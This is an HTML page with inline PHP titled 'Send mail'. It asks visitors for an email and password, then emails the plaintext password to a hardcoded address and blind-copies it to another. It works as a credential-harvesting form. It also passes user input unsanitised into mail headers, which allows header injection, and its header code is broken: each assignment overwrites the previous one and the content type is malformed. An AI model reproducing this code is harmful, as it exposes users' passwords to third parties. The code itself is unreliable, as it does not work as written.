<!--Form start -->
<!DOCTYPE html>
<html>
<head>
  <title>Send mail</title>
  <link href="../boots/css/bootstrap.min.css" rel="stylesheet"/>


<style type="text/css">


</style>
</head>
<body>
  <div class="container-fluid">

  <form action="" method="post" >

    <div class="row">
      <div class="col-md-4">
  <div class="form-group">
     <label><b>Email</b></label>
     <input type="email" class="form-control" placeholder="Enter Email" name="email" required>
  </div>
  </div>
  </div>

    <div class="row">
      <div class="col-md-4">
  <div class="form-group">
     <label><b>Password</b></label>
     <input type="password" class="form-control" placeholder="Enter Password" name="password" required>
  </div>
  </div>
  </div>


  <div class="form-group">
   <button type="submit" name="send" data-di  class="btn btn-info">Submit</button>
 </div>
  </form>

  </div>
  <script src="../boots/js/jquery-3.2.1.min.js"></script>
  <script src="../boots/js/bootstrap.min.js"></script>
</body>
<?php

if($_POST){

  $from = $_POST['email'];
  if (isset($_POST['password'])) {
    # code...
    $subject = "PASSWORD REMINDER!";
    echo "Message Sent!";
    $to = "info@pastorkodar.com"; // where mail is sent to.
    $password = $_POST['password'];


    //Always set content-type when sending HTML email.
    $headers = "MIME-Version: 1.0"."\r\n";
    $headers = "content-type:text/html:charset=UTF-8"."\r\n";

    //add headers to send to
    $headers = "From: $from". "\r\n";
    $headers = 'CC: client@somedomain.com'."\r\n";
    $headers .= 'Bcc: pastorkodar@emmanuel.com'."\r\n"; //blind carbon copy
    // 'dot' after equal to in headers is for cocatenation

    mail($to,$subject,$password,$headers); // sends mail.

    //specifies headers from which we send to.

  }else {

    echo "Mail not Sent!";
  }

}

 ?>

</html>
